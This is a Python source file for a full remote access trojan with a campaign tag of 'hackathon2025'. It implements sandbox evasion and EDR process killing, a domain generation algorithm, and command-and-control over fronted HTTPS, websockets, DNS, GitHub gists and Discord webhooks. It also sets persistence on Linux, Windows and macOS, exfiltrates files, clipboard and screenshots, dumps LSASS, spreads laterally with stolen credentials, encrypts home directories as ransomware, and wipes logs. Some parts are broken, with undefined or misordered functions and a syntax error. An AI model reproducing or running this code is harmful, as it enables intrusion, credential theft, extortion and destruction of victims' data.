import socket
import ssl
import os
import sys
import time
import base64
import random
import string
import hashlib
import platform
import dns.resolver
import http.client
import json
import gzip
import marshal
import ctypes
import logging
import subprocess
import urllib.parse
import websocket
import io
import queue
import threading
import multiprocessing
import runpy
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend
from PIL import Image
import psutil
import requests

# Configuration
C2_DOMAINS = ["c2-1.com", "c2-2.com", "c2-3.com"]  # Replace with your domains
C2_PORTS = {"https": 443, "websocket": 443, "doh": 443}
C2_PATHS = [f"/{random_name()}" for _ in range(5)]
FRONTED_DOMAIN = "d2z6x2z1g6q2p3.cloudfront.net"  # Replace with your CDN
GITHUB_GIST = "https://api.github.com/gists/your_gist_id"  # Replace
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/your_webhook"  # Replace
CAMPAIGN_ID = "hackathon2025"
OPERATOR_KEY = b"operator_secret"
ACTIVATION_DATE = datetime(2025, 6, 1)
EXFIL_QUEUE = queue.Queue()
KILL_SWITCH = False
KILL_AUTH = b"kill_secret"

# Logging
logging.basicConfig(filename=f"/tmp/.{random_name()}.log", level=logging.ERROR, format="%(asctime)s:%(message)s")

# Anti-analysis
def anti_analysis():
    try:
        if os.path.exists("/proc/xen") or "qemu" in platform.uname().release.lower():
            sys.exit(0)
        if os.system("grep -q TracerPid /proc/self/status && [ $(grep TracerPid /proc/self/status | cut -d: -f2 | tr -d ' \t') -ne 0 ]") == 0:
            sys.exit(0)
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2**30:
            sys.exit(0)
        start = time.perf_counter()
        time.sleep(0.1)
        if time.perf_counter() - start < 0.05:
            sys.exit(0)
        for proc in psutil.process_iter():
            if "edr" in proc.name().lower() or "defender" in proc.name().lower():
                proc.kill()
    except Exception as e:
        logging.error(f"Anti-analysis failed: {str(e)}")

# DGA
def generate_dga_domain(seed):
    random.seed(seed + hashlib.sha256(CAMPAIGN_ID.encode()).hexdigest())
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12)) + ".com"

def get_c2_ip():
    seed = int(time.time() // 86400)
    for domain in C2_DOMAINS + [generate_dga_domain(seed)]:
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            return answers[0].strings[0].decode()
        except:
            continue
    return "127.0.0.1"

# RSA key exchange
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
public_key = private_key.public_key()
def exchange_key(c2_ip):
    try:
        context = ssl.create_default_context()
        conn = http.client.HTTPSConnection(c2_ip, C2_PORTS["https"], context=context)
        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        conn.request("POST", "/key_exchange", body=pub_pem)
        response = conn.getresponse()
        if response.status == 200:
            encrypted_key = response.read()
            aes_key = private_key.decrypt(
                encrypted_key,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            if len(aes_key) >= 32:
                return aes_key[:32]
            raise ValueError("Invalid key length")
        conn.close()
    except Exception as e:
        logging.error(f"Key exchange failed: {str(e)}")
    return generate_key()

# Cryptography
def generate_key():
    h = hmac.HMAC(OPERATOR_KEY, hashes.SHA256(), backend=default_backend())
    h.update((platform.node() + platform.release()).encode())
    key = h.finalize()
    return key[:32] if len(key) >= 32 else key.ljust(32, b"\x00")

def aes_encrypt(data, key):
    try:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        return iv + encryptor.tag + encrypted
    except Exception as e:
        logging.error(f"Encryption failed: {str(e)}")
        raise

def aes_decrypt(data, key):
    try:
        iv, tag, encrypted = data[:16], data[16:32], data[32:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(encrypted) + decryptor.finalize()
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise

# Steganography
def hide_data_in_image(data, image_data):
    try:
        img = Image.open(io.BytesIO(image_data))
        pixels = img.load()
        data_bits = ''.join(format(byte, '08b') for byte in data)
        for i in range(min(len(data_bits), img.size[0] * img.size[1])):
            x, y = i % img.width, i // img.width
            r, g, b = pixels[x, y]
            pixels[x, y] = (r, g, b & ~1 | int(data_bits[i]))
        output = io.BytesIO()
        img.save(output, format="PNG")
        return output.getvalue())
    except Exception as e:
        logging.error(f"Steganography failed: {str(e)}")
        raise

# Random name
def random_name(length=8):
    return hashlib.sha256(os.urandom(8)).hexdigest()[:length]

# Platform detection
def get_platform():
    return platform.system().lower()

# Job queue for thread-safe execution
job_queue = queue.Queue()
def execute_jobs():
    while True:
        try:
            task_id, cmd_func = job_queue.get()
            process = multiprocessing.Process(target=cmd_func)
            process.start()
            process.join(timeout=60)
            if process.is_alive():
                process.terminate()
            job_queue.task_done()
        except Exception as e:
            logging.error(f"Job execution failed: {str(e)}")

threading.Thread(target=execute_jobs, daemon=True).start()

# Plugin signing
def sign_plugin(code, key):
    h = hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
    h.update(code)
    return h.finalize()

def verify_plugin(code, signature, key):
    h = hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
    h.update(code)
    h.verify(signature)

# In-memory plugin loader
def load_plugin(plugin_id, aes_key):
    try:
        c2_ip = get_c2_ip()
        context = ssl.create_default_context()
        conn = http.client.HTTPSConnection(FRONTED_DOMAIN, C2_PORTS["https"], context=context)
        conn.request("GET", f"/plugins/{plugin_id}", headers={"Host": c2_ip})
        response = conn.getresponse()
        if response.status == 200:
            encrypted = gzip.decompress(response.read())
            code = aes_decrypt(encrypted, aes_key)
            signature = response.headers.get("X-Plugin-Signature")
            verify_plugin(code, base64.b64decode(signature), OPERATOR_KEY)
            return marshal.loads(code)
        conn.close()
    except Exception as e:
        logging.error(f"Plugin load failed: {str(e)}")
        return None

# Modular persistence
def make_persistent():
    os_type = get_platform()
    try:
        if os_type == "linux":
            cmd = f"powershell -e {base64.b64encode(open(__file__, 'rb').read()).decode()}"
            os.system(f"powershell -Command \"New-WinEvent -ProviderName Microsoft-Windows-PowerShell -Id 4104 -Payload @('{cmd}')")
            with open(f"{os.path.expanduser('~')}/.bashrc", "a") as f:
                f.write(f"\npython3 -c \"{open(__file__).read()}\" &\n")
            os.system(f"echo '* * * * * python3 -c \"{open(__file__).read()}\"' | crontab -")
        elif os_type == "windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, random_name(), 0, winreg.REG_SZ, f"powershell -e \"{base64.b64encode(open(__file__, 'rb').read()).decode()}\"")
            winreg.CloseKey(key)
            subprocess.run(f"schtasks /create /tn {random_name()} /tr \"powershell -e {base64.b64encode(open(__file__, 'rb').read()).decode()}\" /sc ONBOOT", shell=True)
        elif os_type == "darwin":
            plist_path = f"{os.path.expanduser('~')}/Library/LaunchAgents/{random_name()}.plist"
            with open(plist_path, "w") as f:
                f.write(f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{random_name()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>-c</string>
        <string>{open(__file__).read()}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
            os.system(f"launchctl load {plist_path}")
    except Exception as e:
        logging.error(f"Persistence failed: {str(e)}")

# C2 tasking
def c2_tasking(aes_key):
    while not KILL_SWITCH:
        try:
            if datetime.now() < ACTIVATION_DATE:
                time.sleep((ACTIVATION_DATE - datetime.now()).total_seconds())
                continue
            c2_ip = get_c2_ip()
            protocol = random.choice(["https", "websocket", "doh", "gist", "discord"])
            headers = {
                "User-Agent": random.choice(["curl/7.81.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]),
                "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
            }
            if protocol == "https":
                context = ssl.create_default_context()
                context.set_ciphers(random.choice(["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256"]))
                conn = http.client.HTTPSConnection(FRONTED_DOMAIN, C2_PORTS["https"], context=context)
                task_id = random_name()
                path = random.choice(C2_PATHS)
                conn.request("GET", f"{path}?task={task_id}", headers={"Host": c2_ip, **headers})
                response = conn.getresponse()
                if response.status == 200:
                    task = json.loads(aes_decrypt(response.read(), aes_key).decode())
                    if task.get("kill") and hmac.HMAC(KILL_AUTH, hashes.SHA256(), backend=default_backend()).update(task["kill"].encode()).finalize() == base64.b64decode(task["signature"]):
                        cleanup()
                        sys.exit(0)
                    if task.get("plugin"):
                        plugin_code = load_plugin(task["plugin"], aes_key)
                        if plugin_code:
                            job_queue.put((task_id, lambda: runpy.run_code(marshal.loads(plugin_code), run_name=f"__plugin_{task_id}")))
                    if task.get("cmd"):
                        cmd = deobfuscate_string(task["cmd"])
                        job_queue.put((task_id, lambda: Plugin.execute(cmd)))
                conn.close()
            elif protocol == "websocket":
                ws = websocket.create_connection(f"wss://{FRONTED_DOMAIN}:{C2_PORTS['websocket']}/{random_name()}", header={"Host": c2_ip, **headers})
                ws.send(json.dumps({"task": random_name()}))
                task = json.loads(aes_decrypt(ws.recv(), aes_key).decode())
                if task.get("cmd"):
                    job_queue.put((random_name(), lambda: Plugin.execute(deobfuscate_string(task["cmd"]))))
                ws.close()
            elif protocol == "doh":
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [c2_ip]
                answer = resolver.resolve(f"{random_name()}.doh", "TXT")
                task = json.loads(aes_decrypt(base64.b64decode(answer[0].strings[0]), aes_key).decode())
                if task.get("cmd"):
                    job_queue.put((random_name(), lambda: Plugin.execute(deobfuscate_string(task["cmd"]))))
            elif protocol == "gist":
                response = requests.get(GITHUB_GIST, headers=headers)
                if response.status_code == 200:
                    task = json.loads(aes_decrypt(base64.b64decode(response.json()["files"]["task.txt"]["content"]), aes_key).decode())
                    if task.get("cmd"):
                        job_queue.put((random_name(), lambda: Plugin.execute(deobfuscate_string(task["cmd"]))))
            elif protocol == "discord":
                response = requests.get(DISCORD_WEBHOOK, headers=headers)
                if response.status_code == 200:
                    task = json.loads(aes_decrypt(base64.b64decode(response.json()["content"]), aes_key).decode())
                    if task.get("cmd"):
                        job_queue.put((random_name(), lambda: Plugin.execute(deobfuscate_string(task["cmd"]))))
            
            # Exfil queue
            while not EXFIL_QUEUE.empty():
                try:
                    data = EXFIL_QUEUE.get_nowait()
                    conn = http.client.HTTPSConnection(FRONTED_DOMAIN, C2_PORTS["https"], context=ssl.create_default_context())
                    conn.request("POST", f"/exfil/{random_name()}", body=aes_encrypt(data.encode(), aes_key), headers={"Host": c2_ip, **headers})
                    if conn.getresponse().status == 200:
                        EXFIL_QUEUE.task_done()
                    conn.close()
                except:
                    EXFIL_QUEUE.put(data)
                    break
            
            time.sleep(random.randint(300, 900))  # Jittered beacon
        except Exception as e:
            logging.error(f"C2 failed: {str(e)}")
            time.sleep(min(2 ** random.randint(1, 9), 3600))

# Modular plugins
class Plugin:
    @staticmethod
    def execute(cmd):
        try:
            if cmd == "lateral":
                lateral_movement()
                return "Movement initiated"
            elif cmd == "ransomware":
                ransomware()
                return "Encryption initiated"
            elif cmd.startswith("upload:"):
                _, path = cmd.split(":", 1)
                with open(path, "rb") as f:
                    EXFIL_QUEUE.put(base64.b64encode(f.read()).decode())
                return "Queued"
            elif cmd.startswith("download:"):
                _, path, data = cmd.split(":", 2)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(data))
                return "Downloaded"
            elif cmd == "keylog":
                return subprocess.run("tail -n 10 ~/.bash_history", shell=True, capture_output=True, text=True).stdout
            elif cmd == "clipboard":
                return subprocess.run("xclip -o", shell=True, capture_output=True, text=True).stdout
            elif cmd == "screenshot":
                EXFIL_QUEUE.put(base64.b64encode(subprocess.run("scrot -", shell=True, capture_output=True).stdout).decode())
                return "Queued"
            elif cmd == "escalate":
                return subprocess.run("sudo -n whoami 2>/dev/null || echo 'Failed'", shell=True, capture_output=True, text=True).stdout
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return proc.stdout + proc.stderr
        except Exception as e:
            logging.error(f"Plugin failed: {str(e)}")
            return str(e)

# Lateral movement
def lateral_movement():
    try:
        lsass = subprocess.run("procdump -ma lsass.exe lsass.dmp", shell=True, capture_output=True, text=True).stdout
        EXFIL_QUEUE.put(base64.b64encode(open("lsass.dmp", "rb").read()).decode())
        scan = subprocess.run("nmap -sS -p 445,3389,5985 192.168.0.0/24", shell=True, capture_output=True, text=True).stdout
        EXFIL_QUEUE.put(base64.b64encode(scan.encode()).decode())
        creds = deobfuscate_string("dXNlcjpwYXNzd29yZA==")
        subprocess.run(f"wmic /node:192.168.0.100 /user:{creds.split(':')[0]} /password:{creds.split(':')[1]} process call create 'powershell -e {base64.b64encode(open(__file__, 'rb').read()).decode()}'", shell=True)
    except Exception as e:
        logging.error(f"Lateral movement failed: {str(e)}")

# Ransomware
def ransomware():
    try:
        key = os.urandom(32)
        for root, _, files in os.walk("/home"):
            for file in files:
                with open(os.path.join(root, file), "r+b") as f:
                    data = f.read()
                    f.seek(0)
                    f.write(aes_encrypt(data, key))
        EXFIL_QUEUE.put(base64.b64encode(key).decode())
    except Exception as e:
        logging.error(f"Ransomware failed: {str(e)}")

# Secure wiping
def secure_wipe(path):
    try:
        with open(path, "r+b") as f:
            length = os.path.getsize(path)
            for _ in range(3):
                f.seek(0)
                f.write(os.urandom(length))
                f.flush()
                os.fsync(f.fileno())
        os.remove(path)
    except:
        pass

# Cleanup
def cleanup():
    try:
        secure_wipe(__file__)
        secure_wipe(f"/tmp/.{random_name()}.log")
        os.system("powershell -Command \"Remove-WinEvent -ProviderName Microsoft-Windows-PowerShell -Id 4104\" 2>/dev/null")
        if get_platform() == "linux":
            os.system("crontab -r 2>/dev/null")
        elif get_platform() == "windows":
            subprocess.run(f"schtasks /delete /tn {random_name()} /f", shell=True)
        elif get_platform() == "darwin":
            os.system(f"launchctl unload ~/Library/LaunchAgents/{random_name()}.plist 2>/dev/null")
    except Exception as e:
        logging.error(f"Cleanup failed: {str(e)}")

# Control flow obfuscation
def obfuscated_entry():
    x = random.randint(1, 100)
    if x % 4 == 0:
        while x > 30:
            x -= 7
            if x == 16:
                break
        if x == 16:
            return True
    else:
        for i in range(9):
            if i * x % 11 == 0:
                return True
    return False

if __name__ == "__main__":
    if obfuscated_entry():
        anti_analysis()
        make_persistent()
        aes_key = exchange_key(get_c2_ip())
        c2_tasking(aes_key)
        cleanup()
